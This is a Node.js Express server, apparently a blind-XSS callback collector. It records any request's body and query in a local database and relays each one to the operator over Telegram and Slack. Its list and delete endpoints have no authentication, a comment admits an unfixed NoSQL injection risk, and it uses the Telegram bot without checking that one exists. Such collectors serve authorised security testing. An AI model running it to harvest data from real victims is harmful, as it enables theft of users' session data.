const express = require('express');
const app = express();
require('dotenv').config()
const Datastore = require('nedb');
const db = new Datastore({filename: 'out.db', autoload: true});
const bodyParser = require('body-parser');
const Telegram = require('node-telegram-bot-api');
const SlackIncomingWebhook = require('@slack/client').IncomingWebhook;
let SlackWebhook;
let chatId;
let TelegramBot;
// Middleware usage ..
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: true}));
app.set('port', (process.env.PORT || 5000));
if (process.env.SLACK_HOOK_URL) {
  SlackWebhook = new SlackIncomingWebhook(process.env.SLACK_HOOK_URL || '');
}
if (process.env.TELEGRAM_TOKEN && process.env.TELEGRAM_USER_ID) {
  chatId = process.env.TELEGRAM_USER_ID;
  TelegramBot = new Telegram(process.env.TELEGRAM_TOKEN, {polling: true});
}

// Delete row ..
TelegramBot.onText(/\/delete (.+)/, (msg, match) => {
  const resp = match[1]; // TODO @cagatay check the id is string, prevent nosql object injection.
  if (msg.text.endsWith('all')) {
    db.remove({}, {multi: true}, function (err, numRemoved) {
      TelegramBot.sendMessage(chatId, `Removed ${numRemoved} entries from the db`);
    });
  } else {
    db.remove({_id: resp}, {}, (err, numRemoved) => {
      TelegramBot.sendMessage(chatId, `Removed ${numRemoved} entry from the db`);
    });
  }
});

// List gained rows ..
TelegramBot.onText(/\/list/, (msg) => {
  db.find({}, {}, (err, docs) => {
    TelegramBot.sendMessage(chatId, '  🤙 here is your awesome xss request\'s list.. 👻 ``` \n' + JSON.stringify(docs, null, '\t') + ' \n ``` If you want to delete one of them, /delete [_id || all] 👍🏿 ', {parse_mode: 'Markdown'}).catch(err => {
      if (err.code === 'ETELEGRAM' && err.response.body.description === 'Bad Request: message is too long') {
        TelegramBot.sendMessage(chatId, 'Too many docs for one message, sending them one by one.');
        for (let i = 0; i < docs.length; i++) {
          TelegramBot.sendMessage(chatId, JSON.stringify(docs[i], null, '\t'));
        }
      }
    });
  });
});

// Ping - Pong!
TelegramBot.on('message', (msg) => {
  TelegramBot.sendMessage(chatId, `I'm awake! Your chat ID: ${chatId}, don't forget add in your code 🕷`);
});

// Send message to slack with data.
function sendToSlack(doc) {
  SlackWebhook.send(' 🤘🏿 new baby on board! 👻 ``` \n' + JSON.stringify(doc, null, '\t') + ' \n ```', (err, header, statusCode, body) => {
    if (err) {
      console.log('Error:', err);
    } else {
      console.log('Received', statusCode, 'from Slack');
    }
  });
}

// Collect all routes
app.all('/:path*?', (req, res, next) => {
  if (req.params.path) {
    next();
  } else {
    console.log('Collection all requests ...');
    let doc = {
      body: req.body,
      query: req.query
    };
    db.insert(doc, (err, newDoc) => {
      if (newDoc && !err) {
        if (TelegramBot) {
          TelegramBot.sendMessage(chatId, ' 🤘🏿 new baby on board! 👻 ``` \n' + JSON.stringify(doc, null, '\t') + ' \n ```', {parse_mode: 'Markdown'});
        }
        if (SlackWebhook) {
          sendToSlack(doc);
        }
        res.json(doc);
      } else {
        res.json(err);
      }
    });
  }
});

// HTTP List endpoint ..
app.get('/list', (req, res) => {
  db.find({}, (err, docs) => {
    res.json(err ? err : docs)
  });
});

// HTTP Delete endpoint ..
app.get('/delete/:id?', (req, res) => {
  if (req.params.id && req.params.id.length > 0 && typeof req.params.id === 'string') {
    db.remove({_id: req.params.id}, {}, (err, numRemoved) => {
      res.json({err, numRemoved});
    });
  } else {
    res.json({response: 'Please send _id with /delete/123'});
  }
});

// HTTP Listen ..
app.listen(app.get('port'), () => {
  console.log('Node app is running on port', app.get('port'));
});
